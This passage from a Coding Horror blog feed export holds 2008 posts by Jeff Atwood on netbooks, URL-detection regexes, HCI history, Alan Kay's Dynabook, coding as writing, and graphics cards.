There's the 40% Mads was talking about. That is a little shocking when you consider that GZip is simply Deflate plus a checksum and header/footer! (You can <a href="http://www.codinghorror.com/blog/files/deflate-vs-gzip-vs2008-solution.zip">download the source code</a> for this test and try it yourself.)
</p>
<p>
So my point -- and I do have one -- is this: <b>when you say that the information presented on a blog is "dangerous", you're implying the audience is too dumb or inept to read critically</b>.
</p>
<p>
I, for one, have too much respect for my audience to ever do that. I am continually humbled by the quality of the comments and discussion on the blog entries I post. In fact, I'd say that has been the single most surprising thing I've learned in my four plus years of blogging: <b>the best content always begins where the blog post ends.</b> My audience is far, far smarter than I will ever be.
</p>
<p>
On second thought, maybe what I promote on this blog <i>is</i> dangerous: <b>thinking for yourself</b>.
</p>
<p>
But I'm pretty confident you can handle that.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-23T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/youre-reading-the-worlds-most-dangerous-programming-blog/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Web Browser is the New Laptop ]]></title>
<link>https://blog.codinghorror.com/the-web-browser-is-the-new-laptop/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I've been reading a lot of good things about the emerging <a href="http://en.wikipedia.org/wiki/Netbook">"netbook" category of subnotebooks</a>:
</p>
<p>
</p>
<blockquote>
The term netbook refers to a category of small to medium sized, light-weight, low-cost, energy-efficient, Internet-centric laptops, generally optimized for Web surfing and e-mailing.
</blockquote>
<p>
Like any self-respecting nerd, I already <a href="http://www.codinghorror.com/blog/archives/000927.html">own a laptop</a>, of course, but my wife has taken to surfing the internet at night and doing her Java-based New York Times crosswords in bed. Plus there's <a href="http://www.codinghorror.com/blog/archives/001168.html">the whole pregnancy thing</a>, so it'd be nice for her to have her own "space" laptop-wise. So I pulled the trigger on an <a href="http://www.amazon.com/dp/B001DL2BUM/?tag=codihorr-20">Acer Aspire One netbook</a>.
</p>
<p>
<a href="http://www.amazon.com/dp/B001DL2BUM/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
The specs are indeeed modest, but <b>not bad at all for the <a href="http://www.amazon.com/dp/B001DL2BUM/?tag=codihorr-20">$369 sticker price</a></b>:
</p>
<p>
</p>
<ul>
<li>Intel Atom 1.6 Ghz CPU
</li>
<li>802.11 b/g wireless
</li>
<li>1 GB ram
</li>
<li>120 GB hard drive
</li>
<li>8.9" 1024x600 display
</li>
<li>Windows XP Home
</li>
<li>webcam, mic, 3 usb ports, ethernet, vga out.
</li>
</ul>
<p>
I didn't expect much from this cheap, diminutive laptop; it's mostly for web surfing, light email, <i>maybe</i> a tiny bit of miscellaneous office work. And in case the color choice didn't make it clear, it's not even for me. That's my story, and I'm sticking to it!
</p>
<p>
As I sat down to configure this machine, I belatedly realized that for most of what I do with a computer, this cute little netbook is perfectly adequate. Sure, the keyboard is a bit cramped, it's no performance powerhouse, and the screen size, at 1024 x 600, is definitely the minimum necessary for it to be practical. It took some adaptation, but it wasn't frustrating or disappointing to use. It delivered (almost) the same web experience I'd get on my desktop or laptop, with no serious compromises. It just.. <i>worked</i>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
As stupid as it sounds, I had fallen in love with this silly little netbook.
</p>
<p>
But even that's not the whole story -- after spending some time with a netbook, I realized that calling them "small laptops" is a mistake. Netbooks are an entirely different breed of animal. <b>They are cheap, portable web browsers</b>.
</p>
<p>
The most popular application in the world is the web browser. By far. Number two isn't even close. Just check out the front page of <a href="http://wakoopa.com/">Wakoopa's</a> most used apps:
</p>
<p>
<a href="http://wakoopa.com/"><img alt="image placeholder" >
</p>
<p>
By my reckoning, six of the top 10 "apps" here are actually web browsers or websites running in web browsers. It's certainly consistent with how my wife and I are increasingly using our computers. Every day, more and more of what we need to do is delivered through a browser, with fewer and fewer compromises. I spend ridiculous, unhealthy amounts of time browsing the web, and this netbook does that with aplomb.
</p>
<p>
At this point, <b>who cares what operating system you run?</b> Choice of web browser will have a far more profound impact on most people's daily lives. As the prices for netbooks inevitably collapse, they are poised to transform the entire computer market, threatening both Apple and Microsoft.
</p>
<ol>
<li>Apple laptops are beautiful, but I can't imagine the average user who spends all their time in the web browser paying 3 to 4 times the price of a netbook for a Mac laptop. Macs are brilliantly designed, it's true, but that's a hell of a tax to run Safari.<br><br>
</li>
<li>Speaking of taxes, what about <a href="http://www.codinghorror.com/blog/archives/000870.html">the Microsoft Tax?</a> I'm already heavily infatuated with the current iteration of netbooks as represented by the Aspire. And they can only get better and cheaper over time. Imagine a machine with the same specs as the Aspire One but at $299, $199, maybe even $99. It's going to happen. It's inevitable. This is a <i>huge</i> opening for Linux; it's the ideal way to deliver a complete, modern web browser at nearly zero marginal cost to both the vendor and consumer.<br><br>
</li>
<li>The booming growth of netbooks will keep Windows XP alive much longer than expected. As much as I like Vista as a solid (if not stellar) upgrade from XP, the <a href="http://www.codinghorror.com/blog/archives/000646.html">prehistoric 2001 era system requirements for XP</a> still make it a better choice for these kinds of devices. 1 GB of memory is roomy; a measly 16 GB of disk space plenty. Can't say that for Vista. No sir. It's also an opportunity for Microsoft to play games with the Linux market by reducing the price of XP to crazy low, fire sale, everything-must-go levels. But only for "select" and "preferred" OEM vendors, of course, not for the common folks on the street.
</li>
</ol>
<p>
I won't lie. One of the attractions of this particular model is that it runs Windows XP, an operating system I, and every other software vendor on the planet, know by heart. It'll run <i>whatever</i> without me having to think too much about it. But I could easily see myself leaving some of that potential flexibility on the table if the price dropped to $199 or so.  If it runs Firefox 3, or Chrome, or Opera, that's about all I need.
</p>
<p>
I'm quite happy with our <a href="http://www.amazon.com/dp/B001DL2BUM/?tag=codihorr-20">Acer Aspire One netbook</a> for now, but I'll probably be picking up one of the next generation of netbooks for myself.
</p>
<p>
I agree with Omar that <a href="http://www.shahine.com/omar/WelcomeToANewEraOfComputingNetbookAndAtom.aspx">Netbooks are poised to transform computing</a>. They still have a way to go, of course, but <b>the $299 or $199 no-compromises, go-anywhere, zero-monthly-contract-fees web browser in the palm of your hand -- with the requisite 9" or larger screen -- is almost upon us</b>. I guess I hadn't been paying enough attention, because that's a shocker to me.
</p>
<p>
Pitching the web browser as a bona-fide operating system always <a href="http://teddziuba.com/2008/09/a-web-os-are-you-dense.html">seemed stupid to me</a>. Or at least it did, until I sat down with my first netbook. If I were Apple or Microsoft, I'd I'd be watching this category of devices very, <i>very</i> closely.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-25T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-web-browser-is-the-new-laptop/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Problem With URLs ]]></title>
<link>https://blog.codinghorror.com/the-problem-with-urls/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
URLs are simple things. Or so you'd think. Let's say you wanted to detect an URL in a block of text and convert it into a bona fide hyperlink. No problem, right?
</p>
<p>
</p>
<blockquote>
Visit my website at http://www.example.com, it's awesome!
</blockquote>
<p>
To locate the URL in the above text, a simple regular expression should suffice -- we'll look for a string at a word boundary beginning with http:// , followed by one or more non-space characters:
</p>
<p>
</p>
<pre>
bhttp://[^s]+
</pre>
<p>
Piece of cake. This <i>seems</i> to work. There's plenty of forum and discussion software out there which auto-links using exactly this approach. Although it mostly works, it's far from perfect. What if the text block looked like this?
</p>
<p>
</p>
<blockquote>
My website (http://www.example.com) is awesome.
</blockquote>
<p>
<b>This URL will be incorrectly encoded with the final paren</b>. This, by the way, is an <i>extremely</i> common way average everyday users include URLs in their text.
</p>
<p>
What's truly aggravating is that <b>parens in URLs are perfectly legal</b>. They're <a href="http://www.ietf.org/rfc/rfc1738.txt">part of the spec and everything:</a>
</p>
<p>
</p>
<blockquote>
only alphanumerics, the special characters <b>"$-_.+!*'(),"</b>, and reserved characters used for their reserved purposes may be used unencoded within a URL.
</blockquote>
<p>
Certain sites, most notably Wikipedia and MSDN, love to generate URLs with parens. The sites are lousy with the damn things:
</p>
<p>
</p>
<pre>
http://en.wikipedia.org/wiki/PC_Tools_(Central_Point_Software)
http://msdn.microsoft.com/en-us/library/aa752574(VS.85).aspx
</pre>
<p>
URLs with actual parens in them means we can't take the easy way out and ignore the final paren. You could force users to escape the parens, but that's sort of draconian, and it's a little unreasonable to expect your users to know how to escape characters in the URL.
</p>
<p>
</p>
<pre>
http://en.wikipedia.org/wiki/PC_Tools_<font color="red">%28</font>Central_Point_Software<font color="red">%29</font>
http://msdn.microsoft.com/en-us/library/aa752574<font color="red">%28</font>VS.85<font color="red">%29</font>.aspx
</pre>
<p>
To detect URLs correctly in <s>all</s> most cases, you have to come up with something more sophisticated. Granted, this isn't the toughest problem in computer science, but it's one that many coders get wrong. Even coders with years of experience, <a href="http://news.ycombinator.com/item?id=10889">like, say, Paul Graham</a>.
</p>
<p>
If we're more clever in constructing the regular expression, we can do a better job.
</p>
<p>
</p>
<pre>
(?bhttp://[-A-Za-z0-9+&amp;@#/%?=~_()|!:,.;]*[-A-Za-z0-9+&amp;@#/%=~_()|]
</pre>
<p>
</p>
<ol>
<li>The primary improvement here is that we're <i>only</i> accepting a whitelist of known good URL characters. Allowing arbitrary random characters in URLs is setting yourself up for XSS exploits, and I can tell you that <a href="http://www.codinghorror.com/blog/archives/001167.html">from personal experience</a>. Don't do it!
</li>
<li>We only allow certain characters to "end" the URL. Ending a URL in common punctuation marks like period, exclamation point, semicolon, etc means those characters will be considered end-of-hyperlink characters and not included in the URL.
</li>
<li>Parens, if present, are allowed in the URL -- and we absorb the leading paren, if it is there, too.
</li>
</ol>
<p>
I couldn't come up with a way for the regex alone to distinguish between URLs that legitimately end in parens (ala Wikipedia), and URLs that the user has enclosed in parens. Thus, there has to be a handful of postfix code to detect and discard the user-enclosed parens from the matched URLs:
</p>
<p>
</p>
<pre>
if (s.StartsWith("(") &amp;&amp; s.EndsWith(")"))
{
return s.Substring(1, s.Length - 2);
}
</pre>
<p>
That's a whole lot of extra work, just because the URL spec allows parens. We can't fix Wikipedia or MSDN and we certainly can't change the URL spec. But we can ensure that <i>our</i> websites avoid becoming part of the problem. <b>Avoid using parens (or any unusual characters, for that matter) in URLs you create</b>. They're annoying to use, and rarely handled correctly by auto-linking code.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-29T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-problem-with-urls/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ HCI Remixed ]]></title>
<link>https://blog.codinghorror.com/hci-remixed/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I like to take one or two books with me when I travel, and one of the books I chose for this trip is <a href="http://www.amazon.com/exec/obidos/ASIN/0262050889/codihorr-20">HCI Remixed</a>.
</p>
<p>
<a href="http://www.amazon.com/exec/obidos/ASIN/0262050889/codihorr-20"><img alt="image placeholder" >
</p>
<p>
Sometimes the books I choose are a bust. Fortunately that didn't happen this time.
</p>
<p>
HCI Remixed covers all the major milestones in the field of human computer interaction. And when I say major, I mean it: things like <a href="http://www.youtube.com/watch?v=JfIgzSoTMOs">Douglas Engelbart's famous demonstration</a>, now referred to as <a href="http://en.wikipedia.org/wiki/The_Mother_of_All_Demos">The Mother of All Demos</a>:
</p>
<p>
</p>
<blockquote>
On December 9, 1968, Douglas C. Engelbart and the group of 17 researchers working with him in the Augmentation Research Center at Stanford Research Institute in Menlo Park, CA, presented a 90-minute live public demonstration of the online system, NLS, they had been working on since 1962. The public presentation was a session in the Fall Joint Computer Conference held at the Convention Center in San Francisco, and it was attended by about 1,000 computer professionals. This was the <b>public debut of the computer mouse</b>. But the mouse was only one of many innovations demonstrated that day, including hypertext, object addressing and dynamic file linking, as well as shared-screen collaboration  involving two persons at different sites communicating over a network with audio and video interface.
</blockquote>
<p>
So, all those trappings of modern computing that we take for granted today? Engelbart demonstrated them all <i>two years before I was born</i>. It just took a while for the rest of the world to catch up to his vision.
</p>
<p>
That's the lesson of many of the groundbreaking HCI discoveries presented in this book. Some people see further. Engelbart was so far ahead of his time in 1968 that his demonstration wasn't taken seriously -- it seemed absurd and impractical. It really makes you wonder <b>which of today's HCI researchers we're ignoring but shouldn't be</b>.
</p>
<p>
The book also takes an interesting approach; it doesn't summarize the papers, instead, it presents the reflections of current working HCI professionals on the papers. It's a little bit meta. You're hearing the impact of these HCI discoveries -- some big, some small -- as related by young researchers who were heavily influenced by them.
</p>
<p>
As a <b>primer and overview of the field of human computer interaction</b>, it's tough to beat. Reading this reminds me how far we've come, and yet how far we have to go.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-30T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/hci-remixed/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Remembering the Dynabook ]]></title>
<link>https://blog.codinghorror.com/remembering-the-dynabook/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
My <a href="http://www.codinghorror.com/blog/archives/001179.html">recent post on netbooks</a> reminded me of <a href="http://en.wikipedia.org/wiki/Alan_Kay">Alan Kay's</a> original 1972 <a href="http://www.mprove.de/diplom/gui/Kay72a.pdf">Dynabook concept</a> (pdf).
</p>
<p>
</p>
<blockquote>
We now have some reasons for wanting the DynaBook to exist. Can it be fabricated from currently invented technology in quantities large enough to
bring a selling (or renting) price within reach of millions of potential users? The set of considerations which pertain to the more practical aspects of the device (such as size, cost, capability, etc.) are just as important as the more abstruse philosophy which prompted us in the first place. The next few pages discuss some of the tradeoffs involved, and will attempt to convince the reader that a target price of $500 is not totally outrageous. The current cost trends and size of the various components do offer considerable hope that the target can be reached. The analogy to color TVs which can be sold for under S500 is also important to keep in mind.
<p>
Now, what should the DynaBook be?
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The size should be no larger than a notebook; weight less than 4 pounds. The visual display should be able to present at least 4000 printing quality characters with contrast ratios approaching that of a book. Dynamic graphics of reasonable quality should be possible; there should be removable local file storage of at
least one million characters (about 500 ordinary book pages) traded off against several hours of audio (voice/music) files.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The active interface should be a language which uses linguistic concepts not far removed from the owner of the device. The owner will be able to maintain and edit his own files of text and programs when and where he chooses. He can use
his DynaBook as a terminal when at work (or as a connection to the library system when in school).
</p>
<p>
When he is done perusing and has discovered information that he wishes to abstract and take with him, it can rapidly be transferred to his local file storage. The umbilical connection will supply not only information but also extra power for any motors the device might have, allowing high bandwidth transmission of about 300K bits/sec to the file storage, or one 500-page-book in 1/2 minute. The batteries will also be automatically recharging during this connection.
</p>
</blockquote>
<p>
A netbook with a 3G wireless / wifi internet connection is almost eerily close to Kay's original <a href="http://en.wikipedia.org/wiki/Dynabook">Dynabook</a> concept. <b>It only took, what, thirty-six years?</b>
</p>
<p>
Most netbooks have coalesced around these rough specs, as documented on the excellent <a href="http://www.liliputing.com/">netbook-centric website Liliputing</a>:
</p>
<p>
</p>
<ul>
<li>1.6GHz Intel Atom CPU
</li>
<li>9 or 10 inch, 1024 x 600 pixel display
</li>
<li>high capacity hard drive or relatively small (and cheap/slow) solid state disk
</li>
<li>802.11 b/g wireless
</li>
<li>2.5 hour battery life with standard size battery
</li>
<li>2 to 3 pounds
</li>
<li>approximately $350 - $399
</li>
</ul>
<p>
Do netbooks meet the criteria outlined in Kay's original 1972 Dynabook paper? To my eye, yes. They're far cheaper once you factor in inflation relative to his original $500 price point in 1972 dollars. I referred to netbooks as <a href="http://www.codinghorror.com/blog/archives/001179.html">portable web browsers</a> and I stilll believe that is in fact what they are -- inexpensive, ubiquitious, (mostly) full featured portals into the larger internet.
</p>
<p>
But Kay, in a recent <a href="http://blog.wired.com/gadgets/2008/11/museum-celebrat.html">interview with Wired</a>, isn't so sure this is a good thing:
</p>
<p>
</p>
<blockquote>
<b>Wired.com:</b> What do you think of netbooks? They're lightweight and small -- pretty close to two pounds. Do they still need work before they can meet your definition of a Dynabook?
<p>
<b>Kay:</b> I'd like to think that they are finding a form factor and weight that fits human beings better, but I'm presuming that it is because many people use only a small part of what they could do on their larger machines, and much of what they do use computers for can be done through a browser or a few simple apps. So this would be somewhat similar to the limited uses of computing that fit into other even smaller devices such as phones and PDAs. If so, then this is more disappointing than something to be cheered about.
</p>
<p>
<b>I cringe every time I use a browser for many reasons.</b> The browser people had a chance to make a more integrated UI and functionality, but really did pretty much the opposite in almost all respects. But, because of the attraction, and even some real value of stuff on the internet, there is more pressure to do better. I would expect to see some real alternatives to the typical "bad defacto standard" browsers we've had to put up with.
</p>
<p>
There is much to be done here, and to even get back to a number of important integration and workflow ideas that were part of the PARC UI.
</p>
</blockquote>
<p>
Apparently Kay doesn't think much of the current status quo, where you define the status quo as OS X, Windows, or Linux. I suspect much of Kay's objection to the web browser interface is the general passivity of browsing the web; bear in mind that Kay is an educator and originally intended Dynabooks as tools for children to create and explore with <a href="http://www.codinghorror.com/blog/archives/001026.html">something like Logo</a>.
</p>
<p>
Personally, my only objection to current netbook platforms is the stupidly huge power draw of the creaky old Intel 945 motherboard chipset they are <a href="http://techreport.com/articles.x/15204/9">typically built on</a>.
</p>
<p>
</p>
<blockquote>
Looking at these results, one can't help but think that <b>the Atom could be an astoundingly power-efficient processor when coupled with a chipset and platform with a lower power use floor.</b> Intel, of course, has such things in the works for other markets.
</blockquote>
<p>
This is why most <i>current</i> netbooks have mediocre 2 to 2.5 hour battery life -- unless you pick up the mongo extra-large extended batteries, which of course increase size and weight.
</p>
<p>
I hooked up my <a href="http://www.codinghorror.com/blog/archives/000353.html">trusty old kill-a-watt</a> to my wife's netbook and measured almost no difference at all in power consumption between idle and full Prime 95 load. <a href="http://www.anandtech.com/cpuchipsets/showdoc.aspx?i=3276">Intel's Atom CPU</a> is truly astonishingly efficient -- a feat all the more impressive when you realize that on most laptops <a href="http://www.codinghorror.com/blog/archives/001099.html">the CPU is, by far, the number one consumer of power</a>. On our netbook, <b>only 1 or 2 watts</b> of the total ~25 watt idle power draw is attributable to the CPU, a tiny fraction of the overall power consumption. I tried turning off wireless and dimming the screen, but I couldn't get the power draw floor below 18 watts -- that's all attributable to the chipset.
</p>
<p>
Intel did a <a href="http://www.anandtech.com/cpuchipsets/showdoc.aspx?i=3276">fantastic job on the Atom CPU</a>, but they completely phoned it in on the chipset. The next generation of netbooks with more power efficient chipsets should <i>easily</i> double battery life. No question.
</p>
<p>
<b>I think netbooks will be as revolutionary as Kay originally predicted with his DynaBook concept</b>. Though we have only seen the beginning of this trend, I'm not sure the big players really understand how much these early netbooks have <a href="http://blog.wired.com/gadgets/2008/09/netbooks-evolvi.html"><i>already</i> changed the game</a>. It'll probably take several more years for the rest of the market to catch on.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-04T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/remembering-the-dynabook/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Coding: It's Just Writing ]]></title>
<link>https://blog.codinghorror.com/coding-its-just-writing/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In <a href="http://www.codingthewheel.com/archives/programming-aphorisms-of-strunk-and-white">The Programming Aphorisms of Strunk and White</a>, James Devlin does a typically excellent job of examining something I've been noticing myself over the last five years:
</p>
<p>
<b>The unexpected relationship between writing code and <i>writing</i>.</b>
</p>
<p>
There is perhaps no greater single reference on the topic of writing than Strunk and White's <a href="http://www.amazon.com/dp/020530902X/?tag=codihorr-20">The Elements of Style</a>. It's one of those essential books you discover in high school or college, and then spend the rest of your life wondering why other textbooks waste your time with all those <i>unnecessary words</i> to get their point across. Like all truly great books, it permanently changes the way you view the world, just a little.
</p>
<p>
Wikipedia provides <a href="http://en.wikipedia.org/wiki/The_Elements_of_Style">a bit of history and context</a> for this timeless book:
</p>
<p>
</p>
<blockquote>
[The Elements of Style] was originally written in 1918 and privately published by Cornell University professor William Strunk, Jr., and was first revised with the help of Edward A. Tenney in 1935. In 1957, it came to the attention of <a href="http://en.wikipedia.org/wiki/E._B._White">E. B. White</a> at The New Yorker. White had studied under Strunk in 1919 but had since forgotten the "little book" which he called a "forty-three-page summation of the case for cleanliness, accuracy, and brevity in the use of English."
<p>
<a href="http://www.amazon.com/dp/020530902X/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
A few weeks later, White wrote a piece for The New Yorker lauding Professor Strunk and his devotion to "lucid" English prose. The book's author having died in 1946, Macmillan and Company commissioned White to recast a new edition of The Elements of Style, published in 1959. In this revision, White independently expanded and modernized the 1918 work, creating the handbook now known to millions of writers and students as, simply, "Strunk and White". White's first edition sold some two million copies, with total sales of three editions surpassing ten million copies over a span of four decades.
</p>
</blockquote>
<p>
This is all well and good if you plan to become a writer, but what's the connection between this timeless little book and writing a computer program?
</p>
<p>
Writing programs that the computer can understand is challenging, to be sure. That's why so few people, in the big scheme of things, <a href="http://www.codinghorror.com/blog/archives/000635.html">become competent programmers</a>. But writing paragraphs and sentences that your fellow humans can understand -- well, that's even <i>more</i> difficult. The longer you write programs and the older you get, eventually you come to realize that in order to truly succeed, <b>you have to write programs that can be understood by both the computer <i>and</i> your fellow programmers.</b>
</p>
<p>
Of all the cruel tricks in software engineering, this has to be the cruelest. Most of us entered this field because <a href="http://www.codinghorror.com/blog/archives/000890.html">the machines are so much more logical than people</a>. And yet, even when you're writing code explicitly intended for the machine, you're still <i>writing</i>. For other people. Fallible, flawed, distracted human beings just like you. And that's the truly difficult part.
</p>
<p>
I think that's what Knuth was getting at with his concept of <a href="http://www.literateprogramming.com/knuthweb.pdf">Literate Programming</a> (pdf).
</p>
<p>
</p>
<blockquote>
Let us change our traditional attitude to the construction of programs: Instead of imagining that our main task is to instruct a computer what to do, let us concentrate rather on explaining to human beings what we want a computer to do.
<p>
<b>The practitioner of literate programming can be regarded as an essayist, whose main concern is with exposition and excellence of style.</b> Such an author, with thesaurus in hand, chooses the names of variables carefully and explains what each variable means. He or she strives for a program that is comprehensible because its concepts have been introduced in an order that is best for human understanding, using a mixture of formal and informal methods that reinforce each other.
</p>
</blockquote>
<p>
This is, of course, much easier said than done. <b>Most of us spend our entire lives learning how to write effectively.</b> A book like <a href="http://www.amazon.com/dp/020530902X/?tag=codihorr-20">The Elements of Style</a> can provide helpful guideposts that translate almost wholesale to the process of coding. I want to highlight the one rule from Elements of Style that I keep coming back to, over and over, since originally discovering the book so many years ago.
</p>
<p>
</p>
<blockquote>
<b>13. Omit needless words.</b>
<p>
Vigorous writing is concise. A sentence should contain no unnecessary words, a paragraph no unnecessary sentences, for the same reason that a drawing should have no unnecessary lines and a machine no unnecessary parts. This requires not that the writer make all his sentences short, or that he avoid all detail and treat his subjects only in outline, but that every word tell.
</p>
</blockquote>
<p>
What does this say to you about your writing? About <a href="http://nedbatchelder.com/text/deleting-code.html">your code?</a>
</p>
<p>
Coding, after all, is just writing. How hard can it be?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-08T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/coding-its-just-writing/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Feeding My Graphics Card Addiction ]]></title>
<link>https://blog.codinghorror.com/feeding-my-graphics-card-addiction/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Hello, my name is Jeff Atwood, and I'm an addict.
</p>
<p>
<b>I'm addicted... to video cards.</b>
</p>
<p>
In fact, I've been addicted since 1996. Well, maybe a few years earlier than that if you count some of the classic 2D accelerators. But the true fascination didn't start until 1996, when the first consumer hardware 3D accelerators came to market. I followed their development avidly in newsgroups, and tried desperately to be the first kid on my block to own the first one. And boy did I ever succeed. Here's a partial list of what I remember owning in those early days:
</p>
<p>
</p>
<ul>
<li>Rendition Verite V1000
</li>
<li>3dfx Voodoo
</li>
<li>3dfx Voodoo 2
</li>
<li>ATI Rage Pro
</li>
<li>NVIDIA Riva 128
</li>
<li>Matrox G400
</li>
<li>NVIDIA Riva TNT
</li>
<li>NVIDIA GeForce 256
</li>
</ul>
<p>
(This is only a partial list, ranging from about 1996 to 2001 -- I don't want to bore you. And believe me, I could. I mean more than I already am.)
</p>
<p>
These were heady times indeed for 3D graphics enthusiasts (read: PC gamers). I distinctly remember playing <b>the first DOS-based Tomb Raider on my 3dfx Voodoo</b> using the proprietary <a href="http://en.wikipedia.org/wiki/Glide_API">GLIDE API</a>. Sure, it's pathetic by today's standards, but the leap from software 3D to fast hardware 3D was quite dramatic from the trenches -- and far more graphically powerful than any console available.
</p>
<p>
This was a time when you could post a thread on a usenet newsgroup about a brand new 3D card, and one of the creators of the hardware would respond to you, <a href="http://groups.google.com/group/comp.sys.ibm.pc.hardware.video/browse_thread/thread/e5e1b52b75dc4921?hl=en&amp;ie=UTF-8">as Gary Tarolli did to me</a>:
</p>
<p>
</p>
<blockquote>
I first want to say how rewarding it is to read all your reviews after having worked on the design of Voodoo Graphics (the chipset on the Orchid Righteous 3D board) for over two years. <b>I am one of the founders of 3Dfx</b> and one of our goals was to deliver the highest quality graphics possible to the PC gamer. It was and still is a very risky proposition because of the cost sensitivity of the marketplace.  But your reviews help convince me that we did the right thing.
<p>
I thought I would share with you a little bit about what is inside the 3Dfx Voodoo Graphics chipset.  There are 2 chips on the graphics board.  Each is a custom designed ASIC containing approximately 1 million transistors.  Although this number of transistors is on the order of a 486, it is a lot more powerful. Why?  Because the logic is dedicated to graphics and there's a lot of logic to boot.  For example, bilinear filtering of texture maps requires reading four 16-bit texels per pixel (that's 400 Mbytes/sec at 50 Mpixels/sec) and then computing the equation <code>red_result = r0*w0+r1*w1+r2*w2+r3*w3</code> where <code>r0:3</code> are the four red values and <code>w0:3</code> are the four weights based on the where the pixel center lies with respect to the four texels.  This is performed for each color channel (red, green, blue, alpha) resulting in 16 multiples and 12 additions or 28 operations per pixel.  At 50 Mpixels per second that is 1,400 Mops/sec.  The way this is designed in hardware is you literally place 16 multipliers and 12 adders on the chip and hook them together.  And this is only a small part of one chip.  There are literally dozens of multipliers and dozens of adders on each of the two chips dedicated only to graphics.  Each chip performs around 4,000 million actual operations per second, of which around one third are integer multiplies.  These are real operations performed - if you were to try to do these on a CPU (or a DSP) you must also do things like load/store instructions and conditions. In my estimation it would take about a 10,000 Mip computer (peak) to do the same thing that one of our chips does.  This is about 20 of the fastest P5-200 or P6-200 chips per one of our chips.  Not exactly cost-effective.  <b>So if you want to brag, you can say your graphics card has approximately the same compute power as 40 P5-200 chips.</b>  Of course, these numbers are more fun than they are meaningful.  What is meaningful in graphics is what you see on the screen.
</p>
<p>
Now of course, if you were <a href="http://www.codinghorror.com/blog/archives/000234.html">writing a software renderer</a> for a game, you wouldn't attempt to perform the same calculations we perform on our chip on a general purpose CPU.  You would take shortcuts, like using 8-bit color with lookup tables for blending, or performing perspective correction every (n) pixels. The image quality will depend on how many shortcuts you take and how clever you are. Voodoo Graphics takes no shortcuts and was designed to give you the highest quality image possible within the constraint of 2 chips.  As your reviews have shown, it is evident that you can see the difference in quality and performance.
</p>
</blockquote>
<p>
There's nothing quite like having a little chat on usenet with the founder of the company who created the 3D accelerator you just bought. Like I said, it was a simpler time.
</p>
<p>
Just <i>imagine</i> something with the power of forty Pentium-200 chips! Well, you don't have to. There's probably a CPU more powerful than that in your PC right now. But the relative <i>scale</i> of difference in computational power between the CPU and a GPU hasn't changed -- special purpose GPUs <a href="http://www.codinghorror.com/blog/archives/000732.html">really are that much more powerful than general purpose CPUs</a>.
</p>
<p>
After that first taste of hot, sweet GPU power, I was hooked. Every year since then I've made a regular pilgrimage to the temple of the GPU Gods, paying my tithe and bringing home whatever the latest, greatest, state-of-the art in 3D accelerators happens to be. What's amazing is how often, even now, performance doubles yearly.
</p>
<p>
This year, I chose the NVIDIA GTX 280. Specifically, the <a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16814127360%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Video%2BCards-_-MSI-_-14127360&amp;cjsku=N82E16814127360" target="_top">MSI NVIDIA GTX 280 OC</a>, with 1 GB of memory, overclocked out of the box. I hate myself for succumbing to mail-in rebates, but they get me every time -- this card was $375 after rebate.
</p>
<p>
<a href="http://www.jdoqocy.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16814127360%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Video%2BCards-_-MSI-_-14127360&amp;cjsku=N82E16814127360" target="_top"><img alt="image placeholder" >
</p>
<p>
$375 is expensive, but this is still the fastest single card configuration available at the moment. It's also one heck of a lot cheaper than the <a href="http://techreport.com/articles.x/14934/17">comically expensive $650 MSRP</a> these cards were introduced at in June. Pity the poor rubes who bought these cards at launch! Hey, wait a second -- I've been one of those rubes for 10 years now. Never mind.
</p>
<p>
